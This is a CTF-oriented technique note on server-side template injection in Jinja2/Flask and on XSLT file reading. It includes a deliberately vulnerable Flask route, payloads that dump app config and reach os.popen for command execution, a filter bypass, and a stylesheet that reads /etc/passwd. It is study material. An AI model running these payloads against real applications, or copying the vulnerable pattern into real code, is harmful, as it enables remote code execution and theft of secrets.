# Server-Side Template Injection (SSTI) / XSLT Injection

**Category**: Web
**Prevalence**: High — appears across Flask/Jinja2, Django, Java template engines, and XSLT processors
**Signal**: Any user input that ends up inside a template engine's rendering context (not just
HTML template strings, but Python template objects, XSLT stylesheets, or Velocity/FreeMarker
templates). Often manifests as variable interpolation: `{{ request.args.name }}`.

## The technique: Jinja2/Flask (most common)

If user input flows into a template render without escaping:

```python
@app.route("/greet/<name>")
def greet(name):
    template = jinja2.Template(f"Hello {name}!")  # VULNERABLE
    return template.render()
```

Attacker sends: `name = {{ 7 * 7 }}` → renders to `Hello 49!`

Once you confirm math evaluation works, escalate to RCE via accessing Python internals:

**Basic escalation chain**:
```jinja2
{{ request.application.app_root }}    # leaks Flask app path
{{ config }}                          # dumps Flask config (often has secrets)
{{ ''.__class__.__mro__ }}            # walk class hierarchy
{{ ().__class__.__bases__[0].__subclasses__() }}  # access base classes
```

**Advanced (RCE via `__builtins__`)** — requires finding the right class in the subclasses list:
```jinja2
{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
```

Alternatively, if `attr` filter is enabled:
```jinja2
{{ ''|attr('__class__')|attr('__bases__')[0]|attr('__subclasses__')() }}
```

**Key insight**: Jinja2 is *intended* to be safe, but only if you use `Template()` with user
input as a value, not source: use `template.render(user_var=name)` to escape correctly. If the
template *source itself* is user-controlled (like the vulnerable code above), it's game over.

## XSLT variant (even worse)

XSLT processors can be exploited via XXE (XML External Entity) or EXSLT extensions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:ext="http://exslt.org/common">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <ext:node-set select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

An XSLT processor that doesn't disable external entities will read the file and output it.

## Why it works in the wild

1. Developers confuse "template engine" with "safe string interpolation."
2. User input is dynamically spliced into templates to personalize content.
3. Most template engines default to *allowing* expression evaluation (`{{ }}` syntax).
4. The sandbox is rarely perfect (e.g. Jinja2's built-in filters like `attr`, `string` can be
   chained to reach `__import__`).

## Competition approach

1. Test for SSTI by injecting `{{ 7 * 7 }}` or `<%= 7 * 7 %>` and see if it evaluates (not
   rendered as literal text).
2. If it evaluates, identify the template engine (Flask/Jinja2, Django, Java Spring, Ruby ERB,
   PHP Twig, etc.) from error messages or response behavior.
3. Escalate from math evaluation → object introspection → `__import__`/`Runtime.exec()` → RCE.
4. For XSLT, test XXE via entity expansion or EXSLT file reading.

## Source / references

Recurring exploitation pattern across 0xdf's HTB writeups (deserialization vulnerabilities,
template injection, SSTI chains), especially on modern Flask/Django applications. Not a single
source challenge, but a category of vulnerability showing consistent exploitability across CTFs.

## Related

- [[command-injection-post-processing]] — similar escalation from input validation bypass to
  OS-level code execution
